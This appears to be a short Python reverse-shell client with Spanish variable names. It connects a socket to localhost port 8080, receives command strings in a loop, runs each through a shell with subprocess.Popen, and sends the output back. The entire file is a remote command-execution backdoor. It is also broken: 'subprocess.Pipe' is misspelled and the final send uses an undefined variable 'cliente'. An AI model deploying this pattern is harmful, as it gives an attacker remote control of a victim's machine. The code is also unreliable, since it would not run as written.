import socket
import subprocess

user=socket.socket()
user.connect(("localhost",8080))
user.send("1".encode("ascii"))

while True:
    comando=user.recv(1024)
    codigo=comando.decode("ascii")
    consola=subprocess.Popen(codigo,shell=True,stdout=subprocess.Pipe,stderr=subprocess.Pipe)
    cliente.send(consola.stdout.read())
